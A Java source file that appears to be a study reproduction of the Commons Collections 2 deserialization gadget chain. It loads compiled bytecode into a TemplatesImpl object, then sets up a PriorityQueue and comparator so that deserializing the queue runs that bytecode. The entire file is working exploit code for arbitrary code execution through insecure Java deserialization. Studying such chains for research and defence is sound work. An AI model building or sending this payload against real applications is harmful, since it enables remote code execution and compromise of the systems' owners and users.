package com.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.PriorityQueue;

public class CC2 {
    public static void main(String[] args)throws Exception {
        TemplatesImpl templatesimpl = new TemplatesImpl();
        SetFieldValue(templatesimpl,"_name","aaa");
        byte[] code= Files.readAllBytes(Paths.get("C:\\Users\\86151\\hexo-blog\\source\\_posts\\ysoserial\\ysoserial\\target\\classes\\Test.class"));
        byte[][] codes=new byte[][]{code};
        SetFieldValue(templatesimpl,"_bytecodes",codes);
        SetFieldValue(templatesimpl,"_tfactory",new TransformerFactoryImpl());
        SetFieldValue(templatesimpl,"_transletIndex",1);

        InvokerTransformer<Object, Object> invokerTransformer = new InvokerTransformer<>("newTransformer", new Class[]{}, new Object[]{});
        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));
        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
        priorityQueue.add(templatesimpl);
        priorityQueue.add(1);
        SetFieldValue(transformingComparator,"transformer",invokerTransformer);
        String s= serialize(priorityQueue);
        deserialize(s);
    }
    public static void SetFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field declaredField = obj.getClass().getDeclaredField(fieldName);
        declaredField.setAccessible(true);
        declaredField.set(obj, value);
    }
    public static String serialize(Object obj) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }
    public static Object deserialize(String data) throws Exception {
        ByteArrayInputStream bais = new ByteArrayInputStream(Base64.getDecoder().decode(data));
        ObjectInputStream ois = new ObjectInputStream(bais);
        return ois.readObject();
    }

}
